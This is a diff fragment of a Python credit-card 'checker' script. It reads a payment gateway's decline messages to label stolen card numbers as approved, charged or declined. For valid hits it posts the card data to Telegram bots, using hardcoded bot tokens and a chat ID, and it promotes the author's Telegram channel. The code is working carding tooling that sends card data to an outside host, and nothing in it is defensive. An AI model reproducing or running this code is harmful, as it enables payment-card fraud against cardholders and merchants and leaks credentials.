+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 💀
+
+𝗠єѕѕαgє 𝗙яσм 𝗠σ𝗗𝗰α : جربها ترويج انستا
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Limit Exceeded' in response.text:
+    	print(f'''𝗡σиє 🧿
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗡σиє 🧿
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	requests.post(f"""https://api.telegram.org/bot6808504280:AAGCCca-MgFEAGvFxykW6QqIiapLyXXR00U/sendmessage?chat_id=5123986264&text=
+𝗡σиє 🧿
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗡σиє 🧿
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Processor Network Unavailable - Try Again' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗣яσ𝗰єѕѕσя 𝗡єтωσяк 𝗨иαναιℓαвℓє - 𝗧яу 𝗔gαιи ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Declined' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗗є𝗰ℓιиє𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Credit card number is prohibited.' in response.text:
+    	print(f'''𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Security Violation' in response.text:
+    	print(f'''𝗖𝗛𝗔𝗥𝗚𝗘 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+
+    elif 'Your payment could not be taken. Please try again or use a different payment method. payment_method_nonce does not contain a valid payment instrument type.' in response.text:
+	   	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
     else:
-    	print('')
-    time.sleep(25)
+    	print(response.json()['message'])
+    time.sleep(21)
